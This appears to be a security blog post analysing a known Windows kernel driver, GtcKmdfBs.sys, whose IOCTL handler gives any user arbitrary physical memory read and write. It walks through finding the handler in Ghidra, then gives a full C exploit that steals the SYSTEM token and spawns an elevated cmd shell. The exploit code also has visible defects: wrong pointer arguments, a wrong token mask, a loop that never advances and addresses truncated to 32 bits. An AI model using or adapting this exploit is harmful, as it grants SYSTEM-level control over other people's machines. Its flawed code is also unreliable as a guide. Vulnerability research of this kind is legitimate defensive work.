# GtcKmdfBs.sys Vulnerability Analysis #

I came across `GtcKmdfBs.sys` while doing vulnability research on drivers from
the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/). It
had exactly what I was looking for: `MmMapIoSpace` exposed to any authenticated
user. Unfortunately, [VMware's Theat Analysis Unit (TAU)](https://www.vmware.com/security/threat-analysis-unit-tau.html) got to it first with their [awesome research](https://blogs.vmware.com/security/2023/10/hunting-vulnerable-kernel-drivers.html). 
I was recently explaining to my friend how vulnerability research works so I
thought I'd share the mechanics of the vulnerability and how I would find it
again.

## Feasibility Study ##

The first thing to do when trying to find low hanging driver vulnerabilities is
to take a look at the imports.

These are 3 imports that I look for:
* `WdfVersionBind`: the driver is using WDF, the newer driver development
  framework (Windows Driver Framework)
* `IoCreateDevice`: the driver is using WDM, the older driver development
  framework (Windows Driver Model)
* `MmMapIoSpace`: this means that the driver can map any physical address. If an
  attacker can control how this is called, they usually get a relatively
  straight forward LPE

If you get a driver and it doesn't import either `WdfVersionBind` or
`IoCreateDevice`, that driver usually has a dedicated library put out by
Microsoft to deal with that subsystem (networking and audio come to mind). Those
will not be as simple to attack because the way you interract with them is
different.

WDF and WDM drivers can be interracted with `DeviceIoControl`. First, a program
opens a handle to the process using `CreateFileA` to a device object. Then it
uses that device object to make requests with `DeviceIoControl`. If your driver
doesn't create a device object, you can not interract with the driver's code
using `DeviceIoControl`.

Let's dive in.\
![Decompilation of the entry function](https://i.imgur.com/ANPhOMv.png)

This is the entry of the program. If you see `FxDriverEntryWorker`, you are
dealing with a WDF driver.

Going into `FxDriverEntryWorker`, you will be presented with a function that
looks like this. \
![Decompilation of the FxDriverEntryWorker function](https://i.imgur.com/sZcmD1G.png)

If you are decompiling a driver and don't see a `FxDriverEntryWorker`, pick the
function that looks like this. These are the two things to look for:
* `WdfVersionBind`: the most tell-tale sign that you are looking at the
  `FxDriverEntryWorker`
* 3-4 layers of `if` statments

The most important part of `FxDriverEntryWorker` is the `WdfVersionBind`. The
3rd parameter is a pointer to the WDF bind info, which holds a bunch of
important function pointers.

After retyping the location to be a `WDF_BIND_INFO` type, head down to the
`FuncTable` member and change the type to a `WDFFUNCTIONS *`.\
![FuncTable member](https://i.imgur.com/jzMqRjo.png)

Then go to your data types, and edit `_WDFFUNCTIONS`. This will open a window
containing all the function pointers that `FuncTable` holds.\

![WDFFUNCTIONS Window](https://i.imgur.com/h8ykhQo.png)

Now lookup `IoQueueCreate`, right click the bottom result, then find all uses.\
![IoQueueCreate](https://i.imgur.com/NATBapY.gif)

If there are no uses, then your driver does not initialize the device
object in a traditional way, so it probably won't be accessible from 
`DeviceIoControl`.

Clicking on that location, we are sent to this function. Retype the 3rd variable
as a `WDF_IO_QUEUE_CONFIG`. Then you will see `EvtIoDeviceControl` be set to a
function pointer be set to a function pointer. \
![Io Queue](https://i.imgur.com/HopLtLE.png)

This is the function that will handle `DeviceIoControl` calls. So lets see if
there are any potentially dangerous functions that are called. Ghidra gives us
the Function Call Trees window. I had it labeled, but you can just click and see
what functions call what other functions and so on.\
![There it is](https://i.imgur.com/q8K3NUt.gif)

So it looks like we can maybe influence the `MmMapIoSpace` calls.

## Vulnerability Analysis ##

Here is the `mmap_io_space_wrapper` decompilation after a little reverse
engineering:

```c
undefined8 mmap_io_space_wrapper(mmap_io_req *param_1,longlong out_buf)

{
  uint *mapped_memory;
  uint num_of_bytes;
  ulonglong uVar1;
  undefined *out_buf_ptr;
  undefined2 *puVar2;
  uint *puVar3;
  uint *mapped_mem;
  byte size_to_read;
  
  num_of_bytes = (uint)param_1->size * param_1->len_to_copy;
  if (1 < param_1->rd_or_wr) {
    return 0xc0000010;
  }
  mapped_memory =
       (uint *)MmMapIoSpace((void *)(ulonglong)param_1->addr_to_map,(ulonglong)num_of_bytes,
                            MmNonCached);
  if (param_1->rd_or_wr == 0) {
    size_to_read = param_1->size;
    if (size_to_read == 1) {
      mapped_mem = mapped_memory;
      out_buf_ptr = (undefined *)(out_buf + 0x10);
      for (uVar1 = (ulonglong)param_1->len_to_copy; uVar1 != 0; uVar1 = uVar1 - 1) {
        *out_buf_ptr = *(undefined *)mapped_mem;
        mapped_mem = (uint *)((longlong)mapped_mem + 1);
        out_buf_ptr = out_buf_ptr + 1;
      }
    }
    else if (size_to_read == 2) {
      mapped_mem = mapped_memory;
      puVar2 = (undefined2 *)(out_buf + 0x10);
      for (uVar1 = (ulonglong)param_1->len_to_copy; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar2 = *(undefined2 *)mapped_mem;
        mapped_mem = (uint *)((longlong)mapped_mem + 2);
        puVar2 = puVar2 + 1;
      }
    }
    else if (size_to_read == 4) {
      mapped_mem = mapped_memory;
      puVar3 = (uint *)(out_buf + 0x10);
      for (uVar1 = (ulonglong)param_1->len_to_copy; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *mapped_mem;
        mapped_mem = mapped_mem + 1;
        puVar3 = puVar3 + 1;
      }
    }
  }
  else if (param_1->rd_or_wr == 1) {
    size_to_read = param_1->size;
    if (size_to_read == 1) {
      mapped_mem = &param_1->out_len;
      puVar3 = mapped_memory;
      for (uVar1 = (ulonglong)param_1->len_to_copy; uVar1 != 0; uVar1 = uVar1 - 1) {
        *(undefined *)puVar3 = *(undefined *)mapped_mem;
        mapped_mem = (uint *)((longlong)mapped_mem + 1);
        puVar3 = (uint *)((longlong)puVar3 + 1);
      }
    }
    else if (size_to_read == 2) {
      mapped_mem = &param_1->out_len;
      puVar3 = mapped_memory;
      for (uVar1 = (ulonglong)param_1->len_to_copy; uVar1 != 0; uVar1 = uVar1 - 1) {
        *(undefined2 *)puVar3 = *(undefined2 *)mapped_mem;
        mapped_mem = (uint *)((longlong)mapped_mem + 2);
        puVar3 = (uint *)((longlong)puVar3 + 2);
      }
    }
    else {
      if (size_to_read != 4) goto LAB_140009277;
      mapped_mem = &param_1->out_len;
      puVar3 = mapped_memory;
      for (uVar1 = (ulonglong)param_1->len_to_copy; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *mapped_mem;
        mapped_mem = mapped_mem + 1;
        puVar3 = puVar3 + 1;
      }
    }
    LOCK();
    UNLOCK();
  }
LAB_140009277:
  MmUnmapIoSpace(mapped_memory,num_of_bytes);
  return 0;
}
```

The function lets any authenticated user access to `MmMapIoSpace` calls and
seems to be specifically designed to let a program from userspace read and write
to any physical address. If you ever find a driver that does this, congrats! You
might have found a zero day!

## Exploit ##

```c
#include<stdio.h>
#include<stdint.h>

#include<Windows.h>


#define MMM_ioctl 0x88892820
#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

#define EPROC_PID 0x440
#define EPROC_FLINK 0x448
#define EPROC_TOKEN 0x4b8

struct MMM_req_read {
    uint32_t set_to_0;
	uint8_t chunk_len;
	uint32_t addr;
	uint32_t copy_len;
	uint32_t out_len;
};

struct MMM_req_write {
    uint32_t set_to_1;
    uint8_t chunk_len;
    uint32_t addr;
    uint32_t copy_len;
    // char buffer_to_copy[...]
};

typedef NTSTATUS* (fNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
    DWORD ProfileSource,
    PULONG Interval);

// https://vulndev.io/2022/09/24/windows-kernel-exploitation-arbitrary-memory-mapping-x64/
// i thought i had to scan the entire memory but you can just get it for free
void* get_sys_eprocess() {
    fNtQuerySystemInformation* NtQuerySystemInformation;
    PSYSTEM_HANDLE_INFORMATION handle_table_info;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO sys_handle_info;
    HANDLE ntdll_handle;
    ULONG ret_len;

    ntdll_handle = GetModuleHandle(L"ntdll");
    NtQuerySystemInformation = GetProcAddress(ntdll_handle, 
        "NtQuerySystemInformation");
    
    handle_table_info = HeapAlloc(GetProcessHeap(), 
        HEAP_ZERO_MEMORY, 
        SystemHandleInformationSize);
    
    NtQuerySystemInformation(SystemHandleInformation, 
        &handle_table_info, 
        SystemHandleInformationSize, 
        &ret_len);
    sys_handle_info = handle_table_info->Handles[0];
    
    return sys_handle_info.Object;
}

DWORD read_mem(HANDLE driver_hndl, void* addr, uint32_t len, void* out_buf) {
    uint32_t bytes_ret;
    struct MMM_req_read req = { 0 };

    req.set_to_0 = 0; // yea i know not needed, just looks cool ok?
    req.addr = (uint32_t)addr;
    req.chunk_len = 1;
    req.copy_len = len;
    req.out_len = len;


    return DeviceIoControl(driver_hndl, MMM_ioctl, &req, sizeof(req),
        out_buf, len, &bytes_ret, NULL);
}

DWORD write_mem(HANDLE driver_hndl, void* dest, void* src, uint32_t len) {
    struct MMM_req_write* in_buf;
    uint32_t bytes_ret;
    size_t in_buf_len;
    char temp[0x100];

    in_buf_len = sizeof(struct MMM_req_write) + len;

    // TODO: check calloc result
    in_buf = calloc(1, in_buf_len);
    in_buf->set_to_1 = 1;
    in_buf->addr = (uint32_t)dest;
    in_buf->chunk_len = 1;
    in_buf->copy_len = len;
    
    memcpy(in_buf + 0x10, src, len);

    return DeviceIoControl(driver_hndl, MMM_ioctl, &in_buf, in_buf_len,
        temp, 0x100, &bytes_ret, NULL);
}

int main() {
    HANDLE hndl;
    hndl = CreateFile(L"\\\\.\\MTC0303",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hndl == INVALID_HANDLE_VALUE) {
        printf("[!] Couldn't get a handle: %d\n", GetLastError());
        exit(1);
    }
    
    puts("[>] Finding system EPROCESS struct...");
    char sys_eprocess_dump[0x1000];
    void* sys_eprocess_loc;
    uint64_t sys_token;
    DWORD read_res;

    sys_eprocess_loc = get_sys_eprocess();
    printf("[I] system's EPROCESS is at: %p", sys_eprocess_loc);

    // TODO: check read_res
    read_res = read_mem(hndl, sys_eprocess_loc, 
        0x1000, sys_eprocess_dump);
    
    sys_token = *(sys_eprocess_dump + 0x4b8);
    sys_token &= 0xf0;
    printf("[I] system token: %llx\n", sys_token);

    
    puts("[>] Finding our EPROCESS...");
    uint64_t original_token;
    uint32_t our_token_loc;
    char temp[0x1000];
    uint32_t flink;
    DWORD pid;

    pid = GetCurrentProcessId();
    for(;;) {
        flink = *(sys_eprocess_dump + EPROC_FLINK);
        read_mem(hndl, flink - EPROC_FLINK, 0x1000, temp);
        if (*(DWORD*)(temp + EPROC_PID) == pid) break;
    }
    original_token = *(uint64_t*)(temp + EPROC_TOKEN);
    our_token_loc = flink - EPROC_FLINK + EPROC_TOKEN;


    puts("[>] Found our EPROCESS. Replacing token...");
    write_mem(hndl, our_token_loc, &sys_token, sizeof(sys_token));
    
    puts("[>] Replaced token. Popping shell...");
    system("cmd");

    puts("[>] Putting original token back...");
    write_mem(hndl, our_token_loc, &original_token, sizeof(original_token));
    exit(0);
}
```
